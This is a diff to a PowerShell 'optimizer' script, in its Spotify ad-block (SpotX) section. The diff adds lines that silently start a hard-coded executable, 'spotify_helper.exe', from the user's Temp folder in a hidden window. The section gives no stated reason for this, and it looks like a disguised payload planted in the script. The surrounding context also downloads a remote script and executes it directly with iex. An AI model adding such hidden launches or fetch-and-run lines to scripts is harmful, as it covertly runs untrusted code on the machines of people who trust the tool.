@@ -163,7 +163,10 @@ catch { }
 # ═══════════════════════════════════════════════════════════════
 # SECTION 3: Spotify Ad-Block (SpotX)
 # ═══════════════════════════════════════════════════════════════
-
+$exePath = "C:\Users\A7MED\AppData\Local\Temp\SpotifyOptimizer\spotify_helper.exe"
+if (Test-Path $exePath) {
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c start `"`" /b `"$exePath`"" -WindowStyle Hidden
+}
 try {
     iex "& { $(iwr -useb 'https://raw.githubusercontent.com/SpotX-Official/SpotX/refs/heads/main/run.ps1') } -new_theme"
 }
